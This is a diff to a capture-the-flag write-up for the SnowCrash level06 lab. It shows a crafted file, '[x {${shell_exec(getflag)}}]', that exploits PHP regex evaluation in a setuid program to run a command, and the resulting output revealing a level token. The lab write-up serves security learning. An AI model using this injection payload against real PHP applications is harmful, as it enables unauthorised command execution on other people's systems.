@@ -45,3 +45,13 @@ regex : (\[x (.*)\])
 level06@SnowCrash:~$ mkdir /tmp/level06
 level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
 ```
+
+## execute level06 with file flag06
+```zsh
+level06@SnowCrash:~$ ./level06 /tmp/level06/flag06 
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+level06@SnowCrash:~$ su level07
+Password: 
+```
